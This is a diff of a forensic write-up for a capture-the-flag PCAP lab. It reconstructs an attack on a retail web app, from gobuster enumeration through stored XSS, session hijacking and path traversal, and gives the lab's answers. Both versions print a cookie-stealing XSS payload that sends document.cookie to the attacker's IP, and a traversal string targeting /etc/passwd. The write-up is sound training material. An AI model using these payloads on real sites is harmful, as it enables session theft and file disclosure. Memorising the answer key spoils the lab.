@@ -1,164 +1,87 @@
-# RetailBreach PCAP Analysis (CyberDefenders)
-
-## Objective
-Analyze web traffic to identify suspicious activity against a retail web application, reconstruct the attacker’s actions from directory enumeration to stored XSS and session hijacking, and determine which post-compromise actions were performed through the administrative interface.
+<img width="1249" height="550" alt="immagine" src="https://github.com/user-attachments/assets/aeb64896-6fb7-46c7-9b4f-cdf59d3b1ae8" /><img width="2560" height="1440" alt="immagine" src="https://github.com/user-attachments/assets/a7fa90a8-e62b-4f68-8500-fea8ee5c96a9" /># RetailBreach - PCAP Analysis (CyberDefenders)
 
 ## Scenario
-The exercise is based on a PCAP containing suspicious HTTP traffic associated with attacker interaction against an online retail platform.
+In recent days, ShopSphere, a prominent online retail platform, has experienced unusual administrative login activity during late-night hours.
+These logins coincide with an influx of customer complaints about unexplained account anomalies, raising concerns about a potential security breach.
+Initial observations suggest unauthorized access to administrative accounts, potentially indicating deeper system compromise.
 
-The goal is to reconstruct the attacker’s actions by identifying:
-- the attacker IP
-- the directory enumeration tool
-- the XSS payload used against the application
-- the first time the admin user visited the infected page
-- the stolen session token
-- the exploited administrative script
-- the payload used to access a sensitive local file
-- the main post-compromise activity performed through the admin area
+Your mission is to investigate the captured network traffic to determine the nature and source of the breach.
+Identifying how the attackers infiltrated the system and pinpointing their methods will be critical to understanding the attack's scope and mitigating its impact.
 
 ## References
-- CyberDefenders: RetailBreach Lab
-- Main activity types observed during analysis:
-  - HTTP directory enumeration
-  - malicious review submission
-  - stored XSS
-  - session hijacking through cookie theft
-  - authenticated access to admin pages
-  - path traversal / local file access
+- https://cyberdefenders.org/blueteam-ctf-challenges/retailbreach/
 
-## Tools Used
-- Wireshark
-- Statistics → Conversations
-- HTTP packet inspection
-- Follow HTTP Stream
-- Display filters
-- Packet details pane
-- URL decoding
+> [!IMPORTANT]
+> The questions below are not in the original lab order. I arranged them in the order that best matched my investigation flow.
 
-## Investigation Workflow
-1. Reviewed the traffic at a high level and quickly recognized that the lab was almost entirely HTTP-focused, so the main task was web attack reconstruction rather than protocol-heavy packet analysis.
-2. Identified the suspicious external host by looking for repeated automated `GET` requests against many hidden paths on the web server.
-3. Interpreted that burst of requests as directory enumeration rather than normal browsing activity.
-4. Clarified that the question asking for the **tool** referred to the concrete program used, not just the generic technique, so the useful evidence had to come from request metadata such as the `User-Agent`.
-5. Switched from simple path enumeration to attacker-controlled form submissions and isolated the malicious review request used to inject the XSS payload.
-6. Decoded the injected value to recover the readable JavaScript and confirm that the goal of the payload was cookie theft rather than generic script execution.
-7. Interpreted the “first time the admin user visited the infected page” question as a victim-side execution event, not the attacker’s injection time.
-8. Tracked the admin-side requests after the injection and identified the first request where the infected content was actually viewed.
-9. Treated the “session token” question as a session-cookie question and linked the stolen token to later attacker requests that reused the victim’s authenticated state.
-10. Clarified that the question asking for the exploited **script** referred to the vulnerable server-side web file, not to the JavaScript payload itself.
-11. Identified the later administrative request used to access a sensitive system file and interpreted the requested **payload** in the lab’s broad sense: the malicious traversal string inserted into the request.
-12. Because the lab was easy overall, the main effort was not packet extraction but translating ambiguous challenge wording into precise technical questions before answering.
+### Q1 - What is the attacker's IP address?
 
-## Key Evidence
-- Web server identified during analysis:
-  - `73.124.17.52`
-- Attacker host identified during analysis:
-  - `111.224.180.128`
-- Admin / victim host identified during analysis:
-  - `135.143.42.5`
-- Evidence of automated hidden-path discovery:
-  - repeated `GET` requests against non-obvious paths
-- Evidence relevant to the tool question:
-  - the useful distinction was between:
-    - technique: directory enumeration / content discovery
-    - concrete tool: value recoverable from `User-Agent`
-- Directory enumeration tool identified during analysis:
-  - `gobuster`
-- Evidence relevant to the XSS question:
-  - malicious content submitted through the review functionality
-  - encoded payload requiring decoding before it was readable
-- XSS payload recovered during analysis:
-  - `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`
-- Evidence relevant to the victim-view timestamp question:
-  - the important event was the first admin request to the page containing the injected malicious content
-  - this was not the same as the attacker’s original injection request
-- First admin visit to the infected page identified during analysis:
-  - `2024-03-29 12:09:29.471547 UTC`
-- Evidence relevant to the session theft question:
-  - the stolen value was a session identifier reused later by the attacker
-- Stolen session token identified during analysis:
-  - `lqkctf24s9h9lg67teu8uevn3q`
-- Exploited administrative script identified during analysis:
-  - `log_viewer.php`
-- Evidence relevant to the local file access question:
-  - attacker request containing a traversal sequence targeting a system file
-- Sensitive file access payload identified during analysis:
-  - `../../../../../etc/passwd`
+I first checked **Statistics → Conversations**, but that alone is obviously not enough to identify the attacker for real.
+Then I used the filter shown in the screenshot, and, as usual, these damn exercises kind of want you to do that.
 
-## Findings
-- The main analytical difficulty in this lab was not packet complexity but question wording.
-- The traffic itself was mostly easy to interpret once the attack chain was understood.
-- The first major structural point was that the PCAP was centered on web-application abuse rather than on a broader multi-protocol investigation:
-  - **Observed:** the relevant activity was concentrated around HTTP requests tied to enumeration, input injection, victim page views, and authenticated admin access
-  - **Conclusion:** the main task was to reconstruct a web attack chain, not to solve a protocol-comprehension problem
-- A recurring source of friction was vague wording such as `tool`, `script`, `token`, `payload`, and `page`:
-  - **Observed:** several questions could be interpreted either as generic concepts or as very specific artifacts in the traffic
-  - **Conclusion:** the real task was often to first translate the challenge wording into a precise web-forensics question before filtering packets
-- The **tool** question required a technique-versus-program distinction:
-  - **Observed:** repeated hidden-path `GET` requests only proved directory enumeration as a technique
-  - **Conclusion:** the actual answer had to come from identifying metadata such as the `User-Agent`, which pointed to `gobuster`
-- The XSS part was straightforward once attacker-controlled input was isolated:
-  - **Observed:** the malicious input was submitted through the review functionality and had to be decoded to become readable
-  - **Conclusion:** the goal of the XSS was session theft by exfiltrating `document.cookie`
-- The timestamp question was easy to misread:
-  - **Observed:** the question asked when the admin first viewed the infected page, not when the attacker injected the payload
-  - **Conclusion:** the correct timestamp had to come from the victim-side page view event
-- The **session token** question was really about cookie theft:
-  - **Observed:** the attacker later reused a valid session identifier rather than authenticating normally
-  - **Conclusion:** the compromise was based on session hijacking, not password theft
-- The **script** question was also phrased loosely:
-  - **Observed:** the expected answer was the vulnerable administrative PHP file
-  - **Conclusion:** here `script` meant the abused server-side endpoint, not the injected JavaScript
-- The later **payload** question used the word in a broad lab sense:
-  - **Observed:** the answer was a traversal string used to reach `/etc/passwd`
-  - **Conclusion:** the lab used `payload` to mean any malicious exploit input, not necessarily code
-- Some of the deeper reasoning done during the lab was curiosity-driven rather than required:
-  - understanding why the challenge said `tool` instead of simply asking for the `User-Agent`-identified program
-  - understanding why the victim-view event mattered more than the injection time for the compromise timeline
-  - understanding why `payload` was being used even for a simple traversal string
-- The rest of the lab was easy overall, and many answers were found immediately once the wording was translated into precise technical meaning.
+<img width="324" height="94" alt="immagine" src="https://github.com/user-attachments/assets/4b13ca56-9406-456a-b90b-58f4b7bfdf34" />
 
-## Result
-- Web Server: `73.124.17.52`
-- Attacker IP: `111.224.180.128`
-- Admin / Victim IP: `135.143.42.5`
-- Directory Enumeration Tool: `gobuster`
-- XSS Payload: `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`
-- First Admin Visit to the Infected Page: `2024-03-29 12:09:29.471547 UTC`
-- Stolen Session Token: `lqkctf24s9h9lg67teu8uevn3q`
-- Exploited Script: `log_viewer.php`
-- Sensitive File Access Payload: `../../../../../etc/passwd`
+<img width="1123" height="255" alt="immagine" src="https://github.com/user-attachments/assets/5d86033e-031b-4ca6-ab94-2a1933cde162" />
 
-## Mistakes / Friction Points
-- The main difficulty was the ambiguity of the challenge wording:
-  - several questions did not clearly specify whether they wanted a generic concept or a concrete artifact from the traffic
-- A second friction point was the lack of precise terminology:
-  - `tool` could be misread as the general technique instead of the exact program
-  - `script` could be misread as JavaScript instead of a PHP endpoint
-  - `token` could sound vague until translated into session cookie / session identifier
-  - `payload` was used even for a simple traversal string
-- The XSS timestamp question was especially easy to misread:
-  - it was natural to initially think about the attacker’s injection time
-  - the actual question referred to the first victim/admin visit to the infected page
-- Some additional reasoning time was spent on wording interpretation out of curiosity rather than necessity:
-  - what exactly the lab meant by `tool`
-  - what exactly it meant by `payload`
-  - why the victim-side execution moment was the important compromise timestamp
-- The remaining parts that are not emphasized here were mostly easy and were often solved immediately once the wording was translated correctly.
+Not only did it lead me to the actual **POST** that also contains the answer to another question, but in a small dataset like this it was already enough to make **`111.224.180.128`** stand out as the attacker’s IP. 
+The reason is that you can directly see that script there, with **`fetch`** and **`document.cookie`** written in plain sight. 
+A script like that is already enough to make the activity clearly malicious.
 
-## Notes
-- In a real investigation, stronger context would normally already exist in the form of:
-  - web server logs
-  - reverse proxy logs
-  - application logs
-  - session-store evidence
-  - source code review of the vulnerable endpoints
-- Because of that, many of the ambiguities present in this lab would usually be clarified much earlier in a real workflow.
-- The most useful mindset in this lab was to first translate each question into a precise technical meaning before trying to answer from the packets.
-- The exercise also reinforced some practical distinctions:
-  - repeated hidden-path `GET` requests show the enumeration technique
-  - request metadata such as `User-Agent` identifies the concrete tool
-  - XSS should be thought of as attacker-controlled input plus browser execution, not just as “a suspicious POST”
-  - the session token in this context is the stolen session cookie / session identifier
-  - the lab uses `payload` broadly for any malicious input string, including path traversal
-- Because the lab was easy overall, the main value came from clarifying what the questions actually meant and from understanding why the expected answers were phrased the way they were.
+**Answer:** `111.224.180.128`
+
+### Q3 - Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?
+
+To answer this question, just look at the screenshot above.
+The payload is shown directly there in the parameter value,
+
+**Answer:** `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`
+
+### Q2 - Which tool did the attacker use to perform the brute-forcing?
+
+Here I just scrolled through the brute-force attempts and checked one of those requests more closely. 
+Once I opened it, the answer was straightforward, because the **User-Agent** was shown directly in the HTTP details.
+So there was no need to overcomplicate it: I just read the tool name from there, and it was **`gobuster`**.
+
+<img width="900" height="506" alt="immagine" src="https://github.com/user-attachments/assets/81624bd7-7c9f-41d6-ae94-2104143d9c14" />
+
+**Answer:** `gobuster`
+
+
+### Q4 - Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?
+
+Before this question, I changed the time display format to make the timestamp easier to read, which can be done through **View → Time Display Format**.
+After that, going back to the **HTTP** filter, I could see the packet where the attacker had injected the script and then the later activity involving the admin login.
+In this context, that was enough to identify the relevant moment for **Q4**, because the traffic shows the compromised page already in play and the admin-related access happening afterward. So the timestamp visible there is the one used for the answer.
+
+<img width="1249" height="550" alt="immagine" src="https://github.com/user-attachments/assets/9baabc68-0cc6-45c2-814a-6824d3b57f88" />
+
+**Answer:** `2024-03-29 12:09`
+
+### Q5 - Can you provide the session token that the attacker acquired and used for this unauthorized access?
+
+For this question, it was enough to refer back to the previous screenshot and inspect the cookie in its proper location. 
+In the packet details, under **Hypertext Transfer Protocol**, the value is shown in the **`Cookie`** header, and Wireshark also breaks it out as a **cookie pair** immediately below.
+
+**Answer:** `lqkctf24s9h9lg67teu8uevn3q`
+
+### Q6 - What is the name of the script that was exploited by the attacker?
+
+For the last two questions, there was no real need to filter any further, because the traffic was already fairly clean and there was not much noise left. 
+We could have narrowed it down to just the **admin**-related requests, but even without doing that, the relevant packets were already visible near the end of the capture. 
+At that point, one request clearly stood out because it matched the kind of activity the questions were asking about, so to avoid guessing I followed the stream for confirmation.
+
+<img width="1479" height="154" alt="immagine" src="https://github.com/user-attachments/assets/8dc56eff-ec01-4b0f-8583-ec3056c6b835" />
+
+Once the **Follow TCP Stream** output is opened, the situation becomes clear. 
+The request is made to **`/admin/log_viewer.php`**, which directly answers the question about the exploited script.
+
+<img width="907" height="1043" alt="immagine" src="https://github.com/user-attachments/assets/6e30406d-ec9d-49e4-a3a6-208f1ccf7270" />
+
+**Answer:** `log_viewer.php`
+
+### Q7 - Can you identify the specific payload that the attacker used to access a sensitive system file?
+
+In the same screenshot, we can observe that the **`file`** parameter contains **`../../../../../../etc/passwd`**, which directly answers the question about the payload used to access a sensitive system file. 
+The stream removes any ambiguity, because it not only shows the crafted request in full, but also the returned contents of **`/etc/passwd`**, confirming that the traversal payload actually worked.
+
+**Answer:** `../../../../../../etc/passwd`
